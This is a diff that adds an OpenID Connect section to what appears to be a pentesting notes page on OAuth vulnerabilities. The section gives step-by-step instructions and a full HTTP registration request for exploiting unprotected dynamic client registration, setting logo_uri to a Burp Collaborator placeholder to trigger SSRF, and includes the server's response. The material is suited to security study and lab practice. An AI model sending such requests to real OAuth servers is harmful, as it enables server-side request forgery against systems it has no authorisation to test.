@@ -94,5 +94,39 @@ Consider a website that allows users to log in using either a classic, password-
 
 Note that if the site allows users to log in exclusively via OAuth, the `state` parameter is arguably less critical. However, not using a `state` parameter can still allow attackers to construct login CSRF attacks, whereby the user is tricked into logging in to the attacker's account.
 
-\
-\
+## <mark style="color:yellow;">OpenID Connect</mark>
+
+### <mark style="color:yellow;">Identifying OpenID Connect</mark> <a href="#identifying-openid-connect" id="identifying-openid-connect"></a>
+
+Look for the mandatory `openid` scope
+
+### <mark style="color:yellow;">Unprotected dynamic client registration</mark>
+
+1. Identify configuration file `/.well-known/openid-configuration` to get registration\_endpoint
+2. Register your own client app. In the logo\_uri add a external url for SSRF
+
+```http
+POST /reg HTTP/1.1
+Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
+Content-Type: application/json
+
+{
+    "application_type": "web",
+    "client_name": "My Application",
+    "redirect_uris": [
+        "https://client-app.com/callback",
+        "https://client-app.com/callback2"
+        ],
+    "logo_uri": "https://BURP-COLLABORATOR-SUBDOMAIN"
+}
+```
+
+```http
+HTTP/2 201 Created
+[...]
+
+{[...]"client_id":"aqFGUZgiQmXrUphoMV7i6","client_name":"My Application",[...]}
+```
+
+3. Make `GET /client/CLIENT-ID/logo` request and replace the `client_id`
+
